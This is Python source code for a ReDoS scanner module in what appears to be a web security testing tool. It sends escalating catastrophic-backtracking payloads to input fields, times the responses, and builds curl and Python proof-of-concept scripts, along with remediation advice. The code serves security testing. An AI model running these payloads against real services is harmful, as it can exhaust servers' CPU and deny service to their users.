"""
BEATRIX Regular Expression Denial of Service (ReDoS) Scanner

Born from: OWASP ReDoS guidance + CVE research on catastrophic backtracking
https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

TECHNIQUE:
1. Identify inputs validated/processed by regular expressions
2. Supply "evil" strings that trigger exponential backtracking
3. Measure response time delta — backtracking causes measurable delay
4. Common evil patterns: (a+)+ matched against "aaa...!"
5. Nested quantifiers, overlapping alternations, greedy groups

ATTACK VECTORS:
- Email validation: aaaa...@...domains
- URL validation: repeated slashes/dots
- Search/filter fields: regex-processed queries
- Username/password policies: complex input + bad regex
- WAF bypass: craft input that stalls regex-based WAF rules

TIMING APPROACH:
- Baseline response time with normal input
- Escalate payload length exponentially: 10, 20, 40, 80 chars
- If response time grows super-linearly → ReDoS confirmed
- 10x–100x slowdown is typical for confirmed ReDoS

SEVERITY: MEDIUM-HIGH
- Application-level DoS (single request can pin a CPU core)
- Can cascade into full service outage
- Often no rate limiting helps (single request does the damage)

OWASP: A06:2021 - Vulnerable and Outdated Components (regex libraries)

MITRE: T1499.004 (Application or System Exploitation DoS)

CWE: CWE-1333 (Inefficient Regular Expression Complexity)
     CWE-400 (Uncontrolled Resource Consumption)

REFERENCES:
- https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
- https://portswigger.net/daily-swig/redos
- https://github.com/substack/safe-regex
- https://snyk.io/blog/redos-and-catastrophic-backtracking/
"""

import re
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any, AsyncIterator, Dict, List, Optional, Tuple

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class ReDoSPayloadType(Enum):
    """Category of ReDoS payload"""
    EMAIL = "email"          # Email validation regex abuse
    URL = "url"              # URL validation regex abuse
    NUMERIC = "numeric"      # Numeric/decimal patterns
    ALPHANUMERIC = "alnum"   # Username/password validation
    GENERIC_REPEAT = "generic"  # General backtracking triggers
    CUSTOM = "custom"


@dataclass
class ReDoSPayload:
    """A ReDoS test payload with escalating lengths"""
    name: str
    ptype: ReDoSPayloadType
    description: str
    # Payloads of increasing length to measure time growth
    payloads: List[str]
    # Expected pattern: if response time grows super-linearly across lengths


@dataclass
class TimingResult:
    """Result of a timed request"""
    payload: str
    length: int
    response_time_ms: float
    status_code: int
    timed_out: bool = False


# =============================================================================
# EVIL REGEX PAYLOADS
# =============================================================================

def _generate_evil_email_payloads() -> List[str]:
    """Generate payloads that exploit email validation regex backtracking"""
    # Common evil pattern: (^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)
    # Evil input: aaaa...aaa@ (no valid domain, causes backtracking)
    return [
        "a" * 10 + "@" + "a" * 10,     # 21 chars
        "a" * 25 + "@" + "a" * 25,     # 51 chars
        "a" * 50 + "@" + "a" * 50,     # 101 chars
        "a" * 100 + "@" + "a" * 100,   # 201 chars
    ]


def _generate_evil_url_payloads() -> List[str]:
    """Generate payloads for URL validation regex backtracking"""
    # Evil URL regex patterns: nested slashes, dots, alternations
    return [
        "http://" + "/." * 10,
        "http://" + "/." * 25,
        "http://" + "/." * 50,
        "http://" + "/." * 100,
    ]


def _generate_evil_numeric_payloads() -> List[str]:
    """Generate payloads for numeric/decimal validation backtracking"""
    # Pattern: ^(\d+\.?\d*|\d*\.?\d+)$ with input "1" * N + "!"
    return [
        "1" * 15 + "!",
        "1" * 25 + "!",
        "1" * 40 + "!",
        "1" * 60 + "!",
    ]


def _generate_evil_alnum_payloads() -> List[str]:
    """Generate payloads for alphanumeric validation backtracking"""
    # Pattern: ^([a-zA-Z0-9]+)*$ with "a" * N + "!"
    return [
        "a" * 15 + "!",
        "a" * 25 + "!",
        "a" * 35 + "!",
        "a" * 50 + "!",
    ]


def _generate_generic_payloads() -> List[str]:
    """Generic backtracking triggers for common regex patterns"""
    # Exploits nested quantifiers: (a+)+, (a|a)+, (a*)*
    return [
        "a" * 15 + "X",
        "a" * 22 + "X",
        "a" * 28 + "X",
        "a" * 35 + "X",
    ]


# Build payload sets
REDOS_PAYLOADS = [
    ReDoSPayload(
        name="Email Validation ReDoS",
        ptype=ReDoSPayloadType.EMAIL,
        description="Exploits backtracking in email validation regex",
        payloads=_generate_evil_email_payloads(),
    ),
    ReDoSPayload(
        name="URL Validation ReDoS",
        ptype=ReDoSPayloadType.URL,
        description="Exploits backtracking in URL parsing/validation regex",
        payloads=_generate_evil_url_payloads(),
    ),
    ReDoSPayload(
        name="Numeric Validation ReDoS",
        ptype=ReDoSPayloadType.NUMERIC,
        description="Exploits backtracking in numeric/decimal regex validation",
        payloads=_generate_evil_numeric_payloads(),
    ),
    ReDoSPayload(
        name="Alphanumeric Validation ReDoS",
        ptype=ReDoSPayloadType.ALPHANUMERIC,
        description="Exploits nested quantifiers in alphanumeric regex",
        payloads=_generate_evil_alnum_payloads(),
    ),
    ReDoSPayload(
        name="Generic Backtracking ReDoS",
        ptype=ReDoSPayloadType.GENERIC_REPEAT,
        description="Generic backtracking via repeated characters + mismatch",
        payloads=_generate_generic_payloads(),
    ),
]


# =============================================================================
# SCANNER
# =============================================================================

class ReDoSScanner(BaseScanner):
    """
    ReDoS (Regular Expression Denial of Service) Scanner.

    Uses timing-based detection to identify regex backtracking vulnerabilities:

    1. Sends progressively longer evil payloads to input fields
    2. Measures response time for each payload length
    3. Detects super-linear time growth (exponential/polynomial)
    4. Flags inputs where response time grows disproportionately

    Also performs passive detection of:
    - Regex patterns exposed in JavaScript source
    - Error messages revealing regex patterns
    - Known vulnerable regex library versions
    """

    name = "redos"
    description = "Regular Expression Denial of Service Scanner"
    version = "1.0.0"

    checks = [
        "timing_based",
        "passive_regex_detection",
    ]

    owasp_category = "A06:2021"
    mitre_technique = "T1499.004"

    # Detection thresholds
    TIMING_MULTIPLIER_THRESHOLD = 3.0  # 3x growth between sizes
    TIMING_ABSOLUTE_THRESHOLD_MS = 5000  # Consider >5s as suspicious (was 3s — too lenient)
    TIMING_MIN_SUSPICIOUS_MS = 1000     # Below 1s is network jitter, not ReDoS
    BASELINE_SAMPLES = 3  # Number of baseline measurements
    CONFIRM_SAMPLES = 3   # Samples per payload for confirmation (take median)
    TIMEOUT_MS = 10000  # Max wait per request

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.safe_mode = self.config.get("safe_mode", True)
        self.max_payload_length = self.config.get("max_payload_length", 100)

    # =========================================================================
    # TIMING MEASUREMENT
    # =========================================================================

    async def _timed_request(
        self,
        method: str,
        url: str,
        payload: str,
        param_name: str,
        delivery: str = "query",
    ) -> TimingResult:
        """Send a request with timing measurement"""

        start = time.monotonic()
        status = 0
        timed_out = False

        try:
            if delivery == "query":
                resp = await self.get(url, params={param_name: payload})
            elif delivery == "body_form":
                resp = await self.post(url, data={param_name: payload})
            elif delivery == "body_json":
                resp = await self.post(
                    url,
                    json={param_name: payload},
                    headers={"Content-Type": "application/json"},
                )
            elif delivery == "header":
                resp = await self.get(url, headers={param_name: payload})
            else:
                resp = await self.get(url, params={param_name: payload})

            status = resp.status_code

        except httpx.TimeoutException:
            timed_out = True
        except Exception:
            pass

        elapsed_ms = (time.monotonic() - start) * 1000

        return TimingResult(
            payload=payload,  # Store FULL payload for reproduction
            length=len(payload),
            response_time_ms=elapsed_ms,
            status_code=status,
            timed_out=timed_out,
        )

    async def _get_baseline(self, url: str, param_name: str, delivery: str = "query") -> float:
        """Measure baseline response time with normal input"""
        times = []
        for _ in range(self.BASELINE_SAMPLES):
            result = await self._timed_request(
                "GET", url, "normalinput123", param_name, delivery,
            )
            if not result.timed_out:
                times.append(result.response_time_ms)

        if not times:
            return 500.0  # Default if all failed

        return sum(times) / len(times)

    # =========================================================================
    # TIMING-BASED DETECTION
    # =========================================================================

    async def _test_input_field(
        self,
        context: ScanContext,
        param_name: str,
        delivery: str,
        payload_set: ReDoSPayload,
    ) -> AsyncIterator[Finding]:
        """Test a single input field for ReDoS with a specific payload set"""

        # Get baseline
        baseline_ms = await self._get_baseline(context.url, param_name, delivery)

        results: List[TimingResult] = []

        for payload in payload_set.payloads:
            # Safety: skip if payload exceeds our max length
            if len(payload) > self.max_payload_length:
                break

            # Take multiple samples per payload length and use median
            # to eliminate network jitter false positives
            samples = []
            for _ in range(self.CONFIRM_SAMPLES):
                result = await self._timed_request(
                    "GET", context.url, payload, param_name, delivery,
                )
                if result.timed_out:
                    samples.append(result)
                    break
                samples.append(result)

            # Use the median sample
            samples.sort(key=lambda r: r.response_time_ms)
            median_result = samples[len(samples) // 2]
            results.append(median_result)

            # Safety: if timed out, stop escalating
            if median_result.timed_out:
                break

            # Safety: if already very slow, stop
            if median_result.response_time_ms > self.TIMEOUT_MS:
                break

        if len(results) < 3:
            return  # Need at least 3 data points for meaningful growth analysis

        # Analyze timing growth
        is_vulnerable, growth_analysis = self._analyze_timing_growth(baseline_ms, results)

        if is_vulnerable:
            # Determine severity based on timing
            max_time = max(r.response_time_ms for r in results)
            timed_out = any(r.timed_out for r in results)

            if timed_out or max_time > 10000:
                severity = Severity.HIGH
            elif max_time > 5000:
                severity = Severity.HIGH
            elif max_time > 2000:
                severity = Severity.MEDIUM
            else:
                severity = Severity.MEDIUM

            timing_table = "\n".join(
                f"  Length {r.length}: {r.response_time_ms:.0f}ms"
                + (" [TIMEOUT]" if r.timed_out else "")
                for r in results
            )

            # Find the slowest payload for reproduction
            slowest = max(results, key=lambda r: r.response_time_ms)
            evil_payload = slowest.payload

            # Build curl PoC
            from urllib.parse import quote
            if delivery == "query":
                poc_curl = (
                    f"# ReDoS PoC — {param_name} parameter\n"
                    f"# Expected: response time >{slowest.response_time_ms:.0f}ms "
                    f"(baseline: {baseline_ms:.0f}ms)\n"
                    f"time curl -s -o /dev/null -w '%{{time_total}}' "
                    f"'{context.url}?{param_name}={quote(evil_payload)}'"
                )
            elif delivery == "body_form":
                poc_curl = (
                    f"# ReDoS PoC — {param_name} parameter (POST form)\n"
                    f"# Expected: response time >{slowest.response_time_ms:.0f}ms\n"
                    f"time curl -s -o /dev/null -w '%{{time_total}}' "
                    f"-X POST -d '{param_name}={quote(evil_payload)}' "
                    f"'{context.url}'"
                )
            elif delivery == "body_json":
                import json as _json
                poc_curl = (
                    f"# ReDoS PoC — {param_name} parameter (POST JSON)\n"
                    f"# Expected: response time >{slowest.response_time_ms:.0f}ms\n"
                    f"time curl -s -o /dev/null -w '%{{time_total}}' "
                    f"-X POST -H 'Content-Type: application/json' "
                    f"-d '{_json.dumps({{param_name: evil_payload}})!s}' "
                    f"'{context.url}'"
                )
            else:
                poc_curl = (
                    f"# ReDoS PoC — {param_name} header\n"
                    f"time curl -s -o /dev/null -w '%{{time_total}}' "
                    f"-H '{param_name}: {evil_payload}' '{context.url}'"
                )

            # Build Python PoC
            poc_python = (
                f"#!/usr/bin/env python3\n"
                f"\"\"\"ReDoS PoC: {param_name} on {context.url}\"\"\"\n"
                f"import time, httpx\n\n"
                f"url = \"{context.url}\"\n"
                f"param = \"{param_name}\"\n"
                f"payloads = {[r.payload for r in results]!r}\n\n"
                f"print(f\"Baseline (normal input):\")\n"
                f"start = time.monotonic()\n"
                f"httpx.get(url, params={{param: 'normalinput123'}})\n"
                f"print(f\"  {{(time.monotonic()-start)*1000:.0f}}ms\")\n\n"
                f"for p in payloads:\n"
                f"    start = time.monotonic()\n"
            )
            if delivery == "query":
                poc_python += f"    httpx.get(url, params={{param: p}}, timeout=30)\n"
            elif delivery == "body_form":
                poc_python += f"    httpx.post(url, data={{param: p}}, timeout=30)\n"
            elif delivery == "body_json":
                poc_python += f"    httpx.post(url, json={{param: p}}, timeout=30)\n"
            else:
                poc_python += f"    httpx.get(url, headers={{param: p}}, timeout=30)\n"
            poc_python += (
                f"    elapsed = (time.monotonic()-start)*1000\n"
                f"    print(f\"  len={{len(p):3d}}: {{elapsed:.0f}}ms\")\n"
            )

            # Build reproduction steps
            repro_steps = [
                f"1. Send a baseline request to {context.url} with "
                f"'{param_name}=normalinput123' — note the response time (~{baseline_ms:.0f}ms)",
                f"2. Send the same request with '{param_name}' set to progressively "
                f"longer payloads of pattern: {payload_set.description}",
            ]
            for r in results:
                repro_steps.append(
                    f"   - Length {r.length}: '{r.payload[:40]}{'...' if len(r.payload)>40 else ''}' "
                    f"→ {r.response_time_ms:.0f}ms"
                    + (" [TIMEOUT]" if r.timed_out else "")
                )
            repro_steps.append(
                f"3. Observe super-linear growth: {growth_analysis}"
            )
            repro_steps.append(
                f"4. The slowest payload ({slowest.length} chars) took "
                f"{slowest.response_time_ms:.0f}ms vs baseline {baseline_ms:.0f}ms "
                f"({slowest.response_time_ms/baseline_ms:.1f}x slower)"
            )

            # Build request string
            if delivery == "query":
                request_str = (
                    f"GET {context.url}?{param_name}={quote(evil_payload)} HTTP/1.1\n"
                    f"Host: {context.url.split('://')[1].split('/')[0]}\n"
                    f"User-Agent: Beatrix/1.0\n"
                )
            elif delivery in ("body_form", "body_json"):
                ct = "application/x-www-form-urlencoded" if delivery == "body_form" else "application/json"
                request_str = (
                    f"POST {context.url} HTTP/1.1\n"
                    f"Host: {context.url.split('://')[1].split('/')[0]}\n"
                    f"Content-Type: {ct}\n"
                    f"User-Agent: Beatrix/1.0\n\n"
                    f"{param_name}={evil_payload}"
                )
            else:
                request_str = (
                    f"GET {context.url} HTTP/1.1\n"
                    f"Host: {context.url.split('://')[1].split('/')[0]}\n"
                    f"{param_name}: {evil_payload}\n"
                )

            finding = self.create_finding(
                title=f"ReDoS: {payload_set.name} in '{param_name}' ({delivery})",
                severity=severity,
                confidence=Confidence.FIRM if max_time > 3000 else Confidence.TENTATIVE,
                url=context.url,
                description=(
                    f"Regular Expression Denial of Service detected.\n\n"
                    f"Parameter: {param_name}\n"
                    f"Delivery: {delivery}\n"
                    f"Payload type: {payload_set.description}\n"
                    f"Baseline: {baseline_ms:.0f}ms\n\n"
                    f"Timing measurements:\n{timing_table}\n\n"
                    f"Growth analysis: {growth_analysis}\n\n"
                    "A single request with a crafted payload can pin a CPU core "
                    "for an extended period, causing denial of service."
                ),
                evidence=f"Baseline: {baseline_ms:.0f}ms, Max: {max_time:.0f}ms, Growth: {growth_analysis}",
                remediation=(
                    "1. Use atomic groups or possessive quantifiers where possible\n"
                    "2. Set regex execution timeouts (RE2 engine, or regex-timeout)\n"
                    "3. Replace vulnerable regex with non-backtracking alternatives\n"
                    "4. Use linear-time regex engines (RE2, rust-regex)\n"
                    "5. Limit input length before regex processing\n"
                    "6. Use validation libraries instead of raw regex"
                ),
                references=[
                    "https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS",
                ],
            )

            # Attach reproduction artifacts
            finding.payload = evil_payload
            finding.request = request_str
            finding.poc_curl = poc_curl
            finding.poc_python = poc_python
            finding.reproduction_steps = repro_steps

            yield finding

    def _analyze_timing_growth(
        self, baseline_ms: float, results: List[TimingResult]
    ) -> Tuple[bool, str]:
        """Analyze if response times show super-linear (exponential) growth.

        True ReDoS exhibits MONOTONIC exponential growth as payload length
        increases. A single spike followed by normal times is network jitter.

        Requirements for a positive:
        - At least 3 consecutive increasing intervals (monotonic growth)
        - Max response time must exceed baseline by >=5x (not 3x)
        - Max must exceed 1000ms absolute minimum (filters jitter)
        - Timeout at longer payloads is definitive only if shorter payloads also
          showed escalating times
        - NO fallback heuristic comparing first-vs-last (caused FPs)
        """

        if not results or len(results) < 3:
            return False, "Insufficient data (need 3+ measurements)"

        max_time = max(r.response_time_ms for r in results)

        # Sanity: if max_time is LESS than baseline, something is wrong — skip
        if max_time < baseline_ms:
            return False, f"Max ({max_time:.0f}ms) < baseline ({baseline_ms:.0f}ms) — no growth"

        # Check for timeout, but only if we see escalating times leading up to it
        if any(r.timed_out for r in results):
            timed_out_idx = next(i for i, r in enumerate(results) if r.timed_out)
            if timed_out_idx >= 2:
                # Check that times were increasing before the timeout
                pre_times = [results[j].response_time_ms for j in range(timed_out_idx)]
                if all(pre_times[j] < pre_times[j+1] for j in range(len(pre_times)-1)):
                    return True, "Escalating times leading to timeout — confirmed exponential growth"
            # Single timeout without escalation = unreliable
            return False, "Timeout without prior escalation — likely network issue"

        # Must exceed minimum absolute threshold to matter
        if max_time < self.TIMING_MIN_SUSPICIOUS_MS:
            return False, f"Max {max_time:.0f}ms below {self.TIMING_MIN_SUSPICIOUS_MS}ms threshold"

        # Must be meaningfully above baseline (at least 5x)
        if max_time < baseline_ms * 5:
            return False, f"Max {max_time:.0f}ms < 5x baseline {baseline_ms:.0f}ms"

        # Check for MONOTONIC growth: at least 3 consecutive increases with
        # each step showing >= 1.5x growth per step.
        # 3 consecutive increases = exponential curve, not jitter.
        consecutive_increases = 0
        max_consecutive = 0
        for i in range(1, len(results)):
            prev = results[i - 1].response_time_ms
            curr = results[i].response_time_ms

            if prev > 0 and curr > prev * 1.5:  # At least 1.5x growth per step
                consecutive_increases += 1
                max_consecutive = max(max_consecutive, consecutive_increases)
            else:
                consecutive_increases = 0  # Reset — growth must be continuous

        if max_consecutive >= 3:
            first = results[0].response_time_ms
            last = results[-1].response_time_ms
            growth = last / first if first > 0 else 0
            return True, f"Monotonic super-linear growth: {growth:.1f}x over {len(results)} measurements ({max_consecutive} consecutive increases)"

        # No fallback first-vs-last heuristic — it caused false positives
        # from single network spikes. Require genuine monotonic escalation.
        return False, f"No confirmed exponential growth (max: {max_time:.0f}ms, best streak: {max_consecutive} consecutive increases)"

    # =========================================================================
    # INPUT DISCOVERY
    # =========================================================================

    def _extract_input_fields(self, html: str) -> List[Tuple[str, str]]:
        """Extract input field names and likely delivery methods from HTML"""
        fields = []

        # <input> fields
        input_pattern = re.compile(
            r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\'][^>]*>', re.IGNORECASE
        )
        for match in input_pattern.finditer(html):
            name = match.group(1)
            fields.append((name, "body_form"))

        # Check if there's a form with GET method → query delivery
        form_get = re.compile(
            r'<form[^>]*\bmethod\s*=\s*["\']?get["\']?[^>]*>', re.IGNORECASE
        )
        if form_get.search(html):
            for name, _ in list(fields):
                fields.append((name, "query"))

        # Search/filter fields (guessed)
        common_search_params = ["q", "query", "search", "filter", "s", "keyword", "term", "pattern"]
        for param in common_search_params:
            fields.append((param, "query"))

        # Input validation fields
        validation_params = ["email", "url", "username", "phone", "zipcode", "zip", "postcode"]
        for param in validation_params:
            fields.append((param, "body_form"))

        # Deduplicate
        return list(set(fields))

    # =========================================================================
    # MAIN SCAN
    # =========================================================================

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Full ReDoS scan"""

        # Get the page to find input fields
        try:
            resp = await self.get(context.url)
            body = resp.text
        except Exception:
            body = ""

        input_fields = self._extract_input_fields(body)

        if not input_fields:
            # Default: test common query params
            input_fields = [
                ("q", "query"),
                ("search", "query"),
                ("email", "query"),
                ("url", "query"),
                ("input", "query"),
            ]

        # Test each input field with each payload set
        for param_name, delivery in input_fields:
            for payload_set in REDOS_PAYLOADS:
                # Match payload type to field type for efficiency
                if payload_set.ptype == ReDoSPayloadType.EMAIL and "email" not in param_name.lower():
                    continue
                if payload_set.ptype == ReDoSPayloadType.URL and "url" not in param_name.lower():
                    continue
                if payload_set.ptype == ReDoSPayloadType.GENERIC_REPEAT:
                    pass  # Generic payloads test all fields

                async for finding in self._test_input_field(context, param_name, delivery, payload_set):
                    yield finding

        # Passive
        async for finding in self.passive_scan(context):
            yield finding

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Detect exposed regex patterns and vulnerable libraries"""
        if not context.response:
            return

        body = context.response.body if hasattr(context.response, 'body') else ""

        # Detect regex patterns in JavaScript that are known vulnerable
        vuln_regex_patterns = [
            # Nested quantifiers: (a+)+, (a*)+, (a+)*, ([a-zA-Z]+)*
            (r'new\s+RegExp\s*\(\s*["\'].*(?:\+\)[\+\*]|\*\)[\+\*])',
             "Nested quantifier in RegExp constructor"),
            # Overlapping character classes with repetition
            (r'/\([^)]*(?:\[\w-\w\]\+|\.\+)[^)]*\)[\+\*]/',
             "Vulnerable regex literal with nested quantifiers"),
            # Known vulnerable patterns in regex strings
            (r'(?:regex|pattern|re)\s*[=:]\s*["\'].*\([^)]+[\+\*]\)\s*[\+\*]',
             "Regex variable with nested quantifier pattern"),
        ]

        for pattern, description in vuln_regex_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                yield self.create_finding(
                    title=f"Vulnerable Regex Pattern: {description}",
                    severity=Severity.LOW,
                    confidence=Confidence.TENTATIVE,
                    url=context.url,
                    description=(
                        f"Potentially vulnerable regular expression detected in JavaScript:\n"
                        f"{description}\n\n"
                        "Regex patterns with nested quantifiers (e.g., (a+)+) are "
                        "susceptible to catastrophic backtracking."
                    ),
                    evidence=f"Pattern: {pattern}",
                    remediation="Replace with non-backtracking regex or use RE2.",
                )

        # Detect regex error messages that reveal patterns
        error_patterns = [
            (r'Invalid regular expression:.*\/', "Regex error reveals pattern"),
            (r'SyntaxError:.*regular express', "Regex syntax error exposed"),
            (r'PCRE error', "PCRE error message exposed"),
            (r'preg_match.*error', "PHP regex error exposed"),
            (r're\.error.*pattern', "Python regex error exposed"),
        ]

        for pattern, description in error_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                yield self.create_finding(
                    title=f"Regex Error Disclosed: {description}",
                    severity=Severity.LOW,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"Regex error message exposed in response:\n{description}\n\n"
                        "Exposed regex patterns can be reverse-engineered to craft "
                        "ReDoS payloads."
                    ),
                    evidence=f"Pattern: {pattern}",
                    remediation="Suppress detailed regex error messages in production.",
                )
